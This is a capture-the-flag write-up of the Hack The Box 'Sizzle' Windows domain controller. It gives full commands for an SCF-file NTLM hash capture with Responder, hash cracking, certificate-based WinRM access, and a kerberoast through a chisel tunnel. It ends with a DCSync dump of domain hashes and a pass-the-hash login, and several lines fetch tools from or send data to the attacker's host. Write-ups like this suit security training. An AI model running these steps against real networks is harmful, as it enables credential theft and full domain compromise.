nmap scan:

```
PORT      STATE SERVICE
21/tcp    open  ftp
53/tcp    open  domain
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
5986/tcp  open  wsmans
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49668/tcp open  unknown
49670/tcp open  unknown
49678/tcp open  unknown
49686/tcp open  unknown
49687/tcp open  unknown
49690/tcp open  unknown
49693/tcp open  unknown
49708/tcp open  unknown
49725/tcp open  unknown
```

### Enumerating FTP and RPC

```
ftp 10.10.10.103
Connected to 10.10.10.103.
220 Microsoft FTP Service
Name (10.10.10.103:localuser): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
150 Opening ASCII mode data connection.
226 Transfer complete.```
```

We can log in with anonymous and list content but there's anything

```
rpcclient -U "" -N 10.10.10.103
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
```

We can't do anything without authenticating

### Enumerating LDAP

Using this python script we can extract some information:

```
import ldap3
import sys

server = ldap3.Server(sys.argv[1], get_info = ldap3.ALL, port=636, use_ssl=True)
c = ldap3.Connection(server)
c.bind()
print(server.info)
```

With this we know the naming context: `DC=HTB,DC=LOCAL`

### Enumerating port 80

We have a website with a gif:

![image1](/assets/images/htb-sizzle/sizzle1.png)

Using ffuf I found this:

```
ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.103/FUZZ
Images                  [Status: 301, Size: 150, Words: 9, Lines: 2]
aspnet_client           [Status: 301, Size: 157, Words: 9, Lines: 2]
certenroll              [Status: 301, Size: 154, Words: 9, Lines: 2]
images                  [Status: 301, Size: 150, Words: 9, Lines: 2]
```

And with a specific `IIS` wordlist:

```
ffuf -c -w /opt/SecLists/Discovery/Web-Content/IIS.fuzz.txt -u http://10.10.10.103/FUZZ 
/aspnet_client/         [Status: 403, Size: 1233, Words: 73, Lines: 30]
/certenroll/            [Status: 403, Size: 1233, Words: 73, Lines: 30]
/certsrv/mscep_admin    [Status: 401, Size: 1293, Words: 81, Lines: 30]
/certsrv/mscep/mscep.dll [Status: 401, Size: 1293, Words: 81, Lines: 30]
/certsrv/               [Status: 401, Size: 1293, Words: 81, Lines: 30]
/images/                [Status: 403, Size: 1233, Words: 73, Lines: 30]
```

`/certsrv` needs authentication, I'll go back if find credentials

### Enumerating SMB

```
smbclient -L 10.10.10.103
Enter WORKGROUP\localuser's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        CertEnroll      Disk      Active Directory Certificate Services share
        Department Shares Disk      
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Operations      Disk      
        SYSVOL          Disk      Logon server share 
SMB1 disabled -- no workgroup available
```

I have access to the `Department Shares` share:

```
smbclient -N "//10.10.10.103/Department Shares"
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Jul  3 08:22:32 2018
  ..                                  D        0  Tue Jul  3 08:22:32 2018
  Accounting                          D        0  Mon Jul  2 12:21:43 2018
  Audit                               D        0  Mon Jul  2 12:14:28 2018
  Banking                             D        0  Tue Jul  3 08:22:39 2018
  CEO_protected                       D        0  Mon Jul  2 12:15:01 2018
  Devops                              D        0  Mon Jul  2 12:19:33 2018
  Finance                             D        0  Mon Jul  2 12:11:57 2018
  HR                                  D        0  Mon Jul  2 12:16:11 2018
  Infosec                             D        0  Mon Jul  2 12:14:24 2018
  Infrastructure                      D        0  Mon Jul  2 12:13:59 2018
  IT                                  D        0  Mon Jul  2 12:12:04 2018
  Legal                               D        0  Mon Jul  2 12:12:09 2018
  M&A                                 D        0  Mon Jul  2 12:15:25 2018
  Marketing                           D        0  Mon Jul  2 12:14:43 2018
  R&D                                 D        0  Mon Jul  2 12:11:47 2018
  Sales                               D        0  Mon Jul  2 12:14:37 2018
  Security                            D        0  Mon Jul  2 12:21:47 2018
  Tax                                 D        0  Mon Jul  2 12:16:54 2018
  Users                               D        0  Tue Jul 10 14:39:32 2018
  ZZ_ARCHIVE                          D        0  Mon Jul  2 12:32:58 2018

                7779839 blocks of size 4096. 2469039 blocks available
```

On users there are the folder for the users:

```
smb: \users\> dir
  .                                   D        0  Tue Jul 10 14:39:32 2018
  ..                                  D        0  Tue Jul 10 14:39:32 2018
  amanda                              D        0  Mon Jul  2 12:18:43 2018
  amanda_adm                          D        0  Mon Jul  2 12:19:06 2018
  bill                                D        0  Mon Jul  2 12:18:28 2018
  bob                                 D        0  Mon Jul  2 12:18:31 2018
  chris                               D        0  Mon Jul  2 12:19:14 2018
  henry                               D        0  Mon Jul  2 12:18:39 2018
  joe                                 D        0  Mon Jul  2 12:18:34 2018
  jose                                D        0  Mon Jul  2 12:18:53 2018
  lkys37en                            D        0  Tue Jul 10 14:39:04 2018
  morgan                              D        0  Mon Jul  2 12:18:48 2018
  mrb3n                               D        0  Mon Jul  2 12:19:20 2018
  Public                              D        0  Tue Sep 25 22:45:32 2018
```

We can check the permissions with smbcacls:

```
smbcacls -N "//10.10.10.103/Department Shares" Users/Public
REVISION:1
CONTROL:SR|DI|DP
OWNER:BUILTIN\Administrators
GROUP:HTB\Domain Users
ACL:Everyone:ALLOWED/OI|CI/FULL
ACL:S-1-5-21-2379389067-1826974543-3574127760-1000:ALLOWED/OI|CI|I/FULL
ACL:BUILTIN\Administrators:ALLOWED/OI|CI|I/FULL
ACL:Everyone:ALLOWED/OI|CI|I/READ
ACL:NT AUTHORITY\SYSTEM:ALLOWED/OI|CI|I/FULL
```

We can write in the public folder

### SCF File Attack

We can get the hash using [this](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/) attack:

1. Create a `.scf` file with this content:

```
[Shell]
Command=2
IconFile=\\10.10.14.8\share\pentestlab.icon
[Taskbar]
Command=ToggleDesktop
```

2. Set up responder

```
sudo responder -I tun0
```

3. Upload the file:

```
smb: \users\public\> put test.scf
putting file test.scf as \users\public\test.scf (0.6 kb/s) (average 0.6 kb/s)
```

And we get the hash for amanda:

```
[+] Listening for events...
[SMB] NTLMv2-SSP Client   : 10.10.10.103
[SMB] NTLMv2-SSP Username : HTB\amanda
[SMB] NTLMv2-SSP Hash     : amanda::HTB:b89988c7645d457a:98777B5F869DC7112E507E75E75EA7D5:0101000000000000C0653150DE09D201085AD5491804FD08000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D201060004000200000008003000300000000000000001000000002000007E2BADBCA2532CA947E821A9CBDE3EFA40CF923AF5D7C3393C5F59AA3A5097D70A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003800000000000000000000000000
```

Now I'll crack it:

```
.\hashcat.exe -m 5600 .\hash.txt .\rockyou.txt
```

The password is: `Ashare1972`


### Generating a key and a certificate

I'll try to log in with `amanda:Ashare1972` on `http://10.10.10.103/certsrv`, and there's this website:

![image2](/assets/images/htb-sizzle/sizzle2.png)

I'll click on *Request a Certificate*:

![image3](/assets/images/htb-sizzle/sizzle3.png)

Now we can request a certificate and use this to log in with winrm, first create the certificate:

```
openssl genrsa -aes256 -out amanda.key 2048
openssl req -new -key amanda.key -out amanda.csr
```

On the webpage go to *advanced certificate request*, and paste the output of `amanda.csr` here:

![image4](/assets/images/htb-sizzle/sizzle4.png)

Click on `Submit>`, and download the certificate:

![image5](/assets/images/htb-sizzle/sizzle5.png)

Now we can log in with evil-winrm:

```
evil-winrm -i 10.10.10.103 -u amanda -p Ashare1972 -S -k amanda.key -c certnew.cer
```

### Enumerating with bloodhound to find privesc vectors

First I'll download Sharphound and run it:

```
*Evil-WinRM* PS C:\windows\system32\spool\drivers\color> IWR -Uri http://10.10.14.8/SharpHound.exe -Outfile SharpHound.exe
*Evil-WinRM* PS C:\windows\system32\spool\drivers\color> .\SharpHound.exe
```

Now I'll download the `.zip`:

Start a smbserver with smb2 support and username and passwor if you don't use authentication is not going to work:

```
sudo impacket-smbserver -smb2support share . -username test -password test
```

And then transfer it:

```
*Evil-WinRM* PS C:\windows\system32\spool\drivers\color> net use \\10.10.14.8\share /u:test test
*Evil-WinRM* PS C:\windows\system32\spool\drivers\color> copy 20201229055403_BloodHound.zip \\10.10.14.8\share\
```

And open this zip on bloodhound, and you can see that the user `mrlky` is kerberoastable and can perform a DCSync attack:

![image6](/assets/images/htb-sizzle/sizzle6.png)

![image6](/assets/images/htb-sizzle/sizzle7.png)

We can kerberoast but before we have to use chisel to port foward, because port 88 is only listening on the box:

### Port forwarding with chisel

Download the chisel version for windows and transfer it to the box:

```
*Evil-WinRM* PS C:\windows\temp> iwr -uri http://10.10.14.8/c.exe -outfile c.exe
```

Now to the port forward:

```
*Evil-WinRM* PS C:\windows\temp> .\c.exe client 10.10.14.8:8008 R:88:127.0.0.1:88 R:389:localhost:389
```

```
sudo ./chisel server -p 8008 --reverse
```

And use `GetUserSPNs.py` to kerberoast:

```
sudo impacket-GetUserSPNs -request -dc-ip 127.0.0.1 htb.local/amanda                                                                                                                                         
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation        
                                                    
Password:                                                                                               
ServicePrincipalName  Name   MemberOf                                               PasswordLastSet             LastLogon                   Delegation 
--------------------  -----  -----------------------------------------------------  --------------------------  --------------------------  ----------
http/sizzle           mrlky  CN=Remote Management Users,CN=Builtin,DC=HTB,DC=LOCAL  2018-07-10 14:08:09.536421  2018-07-12 10:23:50.871575             
                                                    
                                                    
                                                                                                        
$krb5tgs$23$*mrlky$HTB.LOCAL$http/sizzle*$5f32a4e2c8639868ea644391dedfbcf7$d1d97263ef056292be92488fdf5e321687937a8d1ffcdc7a828fba1e5914a115ae4575baa1321028c5974fbb2b9ea0b28822ad7e7237037a23ecf719533ca890d54618
e10d38df748ed411c7396a41e618bbde41985fe801f783238c1ea9605d8bfd8d42a069de38c594f6ad733633893580bc5c0f8df6dcf01c49bea5688a679cc8a4f01a8620a2aebd55ad8b81a824915c12ad1778c97407bb88ab2b9b94a6d55a5d1e5851a826293b5c5
95fadc0986cbb599394c55c78517663546046d39b5750c615d2cfca6a1672f34d5487ef393a9e0b57bd0279d7e46d8d71775476256e51782acb3215041c7cbac25427db3ad5f18c3a9ad542bb8c45dd44a9f36136c8d023c0c687da2a9c75802e1a44c807166a6680
783bf0ec93c5a4b7092e0919b007d1c76376704d1558ffee6e2eb91657460f70835fe56130323097f9aaae1b33084b3627f17987b912baa16340889fbfe541e7e06843f6d3be0cd7bc2181f6fb52db7acc7dce29f2cbbf23a54ae69ebc8d963f5cd61d89649664328
6ad5da2d7b118427bde31d7397480f0b96cc7f96033d7aea919416b955c128fd9cfd6cdb922a97c22dca5b773ecab59a0a91075a8fd1640a3e6bfe72a347ba887c06e7e9e49707b3f5470e86ebc1dfacede624292d9698cfe1cfd3ee64c154a957cd7e3dda0072182
f6b4dd18f655c731a0c69bf0f92d88caf1cb5995f6b8f91b6971207a5e281dc88f0d67fa978df22ebecb70a845acd0fd049a67e95e543a9847e4f88545b8bba243dd08a27326e0473a9712f42ba2458c2e0c63ce88745e687571a95e15ef0ee002b4c86542b25b5d8
125e1d4b38fbf4738393f9c95a3d3d586b5e3cc5ab5ec7933bcadc5c289a401f7072d93abeca1e5e5737f9cfe7fadddea5f4da88701a7f98bb1649efb18a222d0044140254b3732525c39422ca437ae0be10342e69a86e31e8edb242f22a0d5198bf0095f7d7e3a86
6a025966d7e63465b534fc8267e0c396b8a9cb88a1d2ae4dcabcd314eba482dfcf2624fdcbe078591cbea64b7a702774ffe306a80845c0c81259cd23a1c15b2e5f189cfb1bcc9e6f9c2859c86ada0abfa73f60fe3de0ae439073eef7c6ede2b6e5fe145baf536b52e
489b2078d72b2cc91e66571a0751d139a75ae6c9a07720b231efc11818c0db35ec6f108ef6c13febd8e87855277f8350737856546bda72fc1e95669be49e23d2b73756cb7ed424415d956b91ee3f19d82c01e788282d22f91af 
```

Crack the hash:

```
.\hashcat.exe -m 13100 .\hash.txt .\rockyou.txt
```

The password is: `Football#7`

### DCSync attack

With the mrlky credentials we can perform the DCSync attack

```
sudo impacket-secretsdump 'mrlky:Football#7@10.10.10.103'
Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
amanda:1104:aad3b435b51404eeaad3b435b51404ee:7d0516ea4b6ed084f3fdf71c47d9beb3:::
mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
sizzler:1604:aad3b435b51404eeaad3b435b51404ee:d79f820afad0cbc828d79e16a6f890de:::
SIZZLE$:1001:aad3b435b51404eeaad3b435b51404ee:5174a9dec906300a9fb0e35662e4b849:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:e562d64208c7df80b496af280603773ea7d7eeb93ef715392a8258214933275d
Administrator:aes128-cts-hmac-sha1-96:45b1a7ed336bafe1f1e0c1ab666336b3
Administrator:des-cbc-md5:ad7afb706715e964
krbtgt:aes256-cts-hmac-sha1-96:0fcb9a54f68453be5dd01fe555cace13e99def7699b85deda866a71a74e9391e
krbtgt:aes128-cts-hmac-sha1-96:668b69e6bb7f76fa1bcd3a638e93e699
krbtgt:des-cbc-md5:866db35eb9ec5173
amanda:aes256-cts-hmac-sha1-96:60ef71f6446370bab3a52634c3708ed8a0af424fdcb045f3f5fbde5ff05221eb
amanda:aes128-cts-hmac-sha1-96:48d91184cecdc906ca7a07ccbe42e061
amanda:des-cbc-md5:70ba677a4c1a2adf
mrlky:aes256-cts-hmac-sha1-96:b42493c2e8ef350d257e68cc93a155643330c6b5e46a931315c2e23984b11155
mrlky:aes128-cts-hmac-sha1-96:3daab3d6ea94d236b44083309f4f3db0
mrlky:des-cbc-md5:02f1a4da0432f7f7
sizzler:aes256-cts-hmac-sha1-96:85b437e31c055786104b514f98fdf2a520569174cbfc7ba2c895b0f05a7ec81d
sizzler:aes128-cts-hmac-sha1-96:e31015d07e48c21bbd72955641423955
sizzler:des-cbc-md5:5d51d30e68d092d9
SIZZLE$:aes256-cts-hmac-sha1-96:759d520a18c10899dfd9a9a43717fc1c07c3af932cc0e4c7271beda46e64d526
SIZZLE$:aes128-cts-hmac-sha1-96:74b58946a96ff02fc7e71e972c5ba8ce
SIZZLE$:des-cbc-md5:94b313e67c68bf0e
[*] Cleaning up... 
```

And login with `wmiexec` with the administrator hash:

```
sudo impacket-wmiexec -hashes aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267 administrator@10.10.10.103
```
